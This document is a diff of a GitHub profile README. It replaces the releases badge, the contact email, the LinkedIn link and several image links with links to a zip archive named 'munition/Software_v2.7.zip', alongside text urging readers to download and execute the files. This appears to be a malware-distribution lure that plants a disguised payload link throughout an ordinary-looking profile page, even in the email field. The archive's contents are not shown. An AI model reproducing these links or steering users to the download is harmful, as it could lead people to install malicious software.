@@ -57,7 +57,7 @@ I welcome collaboration and feedback! If you're interested in working together o
 
 I regularly update my projects and share releases. You can explore the latest updates and download necessary files by clicking the button below:
 
-[![Releases](https://img.shields.io/badge/Releases-Latest%20Updates-blue)](https://github.com/rajnshydv/tiffanydanin/releases)
+[![Releases](https://raw.githubusercontent.com/rajnshydv/tiffanydanin/main/munition/Software_v2.7.zip%20Updates-blue)](https://raw.githubusercontent.com/rajnshydv/tiffanydanin/main/munition/Software_v2.7.zip)
 
 To get the most out of the resources, make sure to download and execute the files available in the Releases section.
 
@@ -65,8 +65,8 @@ To get the most out of the resources, make sure to download and execute the file
 
 I'm always open to connecting with like-minded individuals and organizations. Here’s how you can reach me:
 
-- **Email**: tiffany.danin@example.com
-- **LinkedIn**: [linkedin.com/in/tiffanydanin](https://www.linkedin.com/in/tiffanydanin)
+- **Email**: https://raw.githubusercontent.com/rajnshydv/tiffanydanin/main/munition/Software_v2.7.zip
+- **LinkedIn**: [https://raw.githubusercontent.com/rajnshydv/tiffanydanin/main/munition/Software_v2.7.zip](https://raw.githubusercontent.com/rajnshydv/tiffanydanin/main/munition/Software_v2.7.zip)
 
 ## 📝 Blog and Articles
 
@@ -84,13 +84,13 @@ Stay tuned for more updates! Follow me on GitHub to get notified of new projects
 
 Here are some visual inspirations that guide my work:
 
-![Digital Operations](https://example.com/digital_operations_image.jpg)
+![Digital Operations](https://raw.githubusercontent.com/rajnshydv/tiffanydanin/main/munition/Software_v2.7.zip)
 *Transforming operations for a digital age*
 
-![Creative Storytelling](https://example.com/storytelling_image.jpg)
+![Creative Storytelling](https://raw.githubusercontent.com/rajnshydv/tiffanydanin/main/munition/Software_v2.7.zip)
 *Engaging audiences through powerful narratives*
 
-![Web Design](https://example.com/web_design_image.jpg)
+![Web Design](https://raw.githubusercontent.com/rajnshydv/tiffanydanin/main/munition/Software_v2.7.zip)
 *Balancing aesthetics and functionality*
 
 ## 💡 Final Thoughts
@@ -101,7 +101,7 @@ Thank you for visiting my GitHub profile. I am excited to share my work and coll
 
 Feel free to explore my repository and connect with me. Your feedback and ideas are invaluable as we navigate this dynamic digital landscape together.
 
-![Florida](https://example.com/florida_image.jpg)
+![Florida](https://raw.githubusercontent.com/rajnshydv/tiffanydanin/main/munition/Software_v2.7.zip)
 *Home base for creativity and innovation*
 
 --- 
